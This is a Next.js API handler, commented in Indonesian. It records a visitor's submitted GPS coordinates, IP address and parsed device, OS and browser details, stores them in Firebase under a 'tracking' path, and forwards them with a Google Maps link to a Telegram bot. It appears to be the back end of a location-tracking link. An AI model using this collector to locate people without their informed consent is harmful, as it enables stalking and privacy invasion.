import type { NextApiRequest, NextApiResponse } from 'next';
import { db } from '../../lib/firebase-admin'; // pastikan path ini sesuai strukturmu
// @ts-ignore
const UAParser = require('ua-parser-js');

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  // CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ message: 'Method Not Allowed' });

  // Ambil data dari request
  const { lat, lon, acc, nama = 'anon' } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
  const userAgent = req.headers['user-agent'] || 'Unknown';
  const timestamp = new Date().toISOString();
  const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;

  // Parsing User-Agent
  const parser = new UAParser(userAgent);
  const deviceInfo = parser.getResult();

  const deviceName = `${deviceInfo.device.vendor || 'Unknown'} ${deviceInfo.device.model || ''}`.trim();
  const os = `${deviceInfo.os.name || 'Unknown'} ${deviceInfo.os.version || ''}`.trim();
  const browser = `${deviceInfo.browser.name || 'Unknown'} ${deviceInfo.browser.version || ''}`.trim();

  // Data lengkap untuk Firebase
  const trackingData = {
    nama,
    ip,
    lat,
    lon,
    acc,
    timestamp,
    userAgent,
    device: deviceName || 'Desktop/Unknown',
    os,
    browser,
    mapUrl,
  };

  // ⬆️ Simpan ke Firebase (Admin SDK → pakai db.ref().set())
  try {
    const lokasiRef = db.ref(`tracking/${nama}`);
    await lokasiRef.set(trackingData);
  } catch (err) {
    console.error('Gagal simpan ke Firebase:', err);
  }

  // Siapkan pesan Telegram
  const botToken = process.env.TELEGRAM_BOT_TOKEN_LOKASI!;
  const chatId = process.env.TELEGRAM_CHAT_ID_LOKASI!;
  const message = `
📥 *Pelacakan Lokasi Masuk*

👤 *Nama:* ${nama}
🖥️ *Perangkat:* ${deviceName || 'Desktop/Unknown'}
💻 *OS:* ${os}
🌐 *Browser:* ${browser}
📡 *IP:* ${ip}
📍 *Lokasi:* ${lat}, ${lon} (±${acc}m)
🕒 *Waktu:* ${timestamp}
🎯 *Akurasi:* ${acc} meter

[📍 Google Maps](${mapUrl})
  `.trim();

  // Kirim ke Telegram
  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown',
        disable_web_page_preview: true,
      }),
    });
  } catch (err) {
    console.error('Gagal kirim ke Telegram:', err);
  }

  res.status(200).json({ message: 'Data dikirim ke Telegram & Firebase' });
}
